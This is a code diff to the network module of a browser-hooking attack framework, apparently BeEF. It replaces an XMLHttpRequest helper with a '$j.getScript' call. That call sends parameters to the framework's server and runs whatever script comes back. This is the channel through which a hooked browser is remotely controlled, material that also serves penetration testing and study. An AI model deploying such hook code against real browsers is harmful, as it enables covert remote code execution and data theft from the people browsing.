@@ -8,24 +8,7 @@ beef.net = {
 	beef_url: "<%= @beef_url %>",
 	beef_hook: "<%= @beef_hook %>",
 	beef_queue: [],
-	
-	/**
-	 * Gets an object that can be used for ajax requests.
-	 * 
-	 * @example: var http = beef.net.get_ajax();
-	 */
-  	get_ajax: function() {
-		
-		// try objects
-		try {return new XMLHttpRequest()} catch(e) {};
-	    try {return new ActiveXObject('Msxml2.XMLHTTP')} catch(e) {};
-	    try {return new ActiveXObject('Microsoft.XMLHTTP')} catch(e) {};
-	
-		// unsupported browser
-		console.log('You browser is not supported')
-		console.log('please provide details to dev team')
-		return false;
-	},
+
 	
 	/**
 	 * Build param string from hash.
@@ -60,34 +43,20 @@ beef.net = {
 	/**
 	 * Performs http requests.
 	 * @param: {String} the url to send the request to.
-	 * @param: {String} the method to use: GET or POST.
+	 * @param: {String} the method to use: GET or POST - **NOTE** This param now ignored
 	 * @param: {Function} the handler to callback once the http request has been performed.
 	 * @param: {String} the parameters to send for a POST request.
 	 * 
 	 * @example: beef.net.raw_request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
 	 */
-	raw_request: function(url, method, handler, params) {
-		var http;
-		var method = method || 'POST';
-		var params = params || null;		
-		var http = this.get_ajax() || null;
-
-		http.open(method, url, true);
-			
-		if(handler) {
-			http.onreadystatechange = function() {
-				if (http.readyState == 4) handler(http.responseText);
-			}
-		}
-			
-		http.send(params);
-
+	raw_request: function(url, method, handler, params) {		
+		$j.getScript( url + '?' + params);
 	},
 	
 	/**
 	 * Performs http requests with browoser id.
 	 * @param: {String} the url to send the request to.
-	 * @param: {String} the method to use: GET or POST.
+	 * @param: {String} the method to use: GET or POST - **NOTE** This param now ignored
 	 * @param: {Function} the handler to callback once the http request has been performed.
 	 * @param: {String} the parameters to send for a POST request.
 	 * 
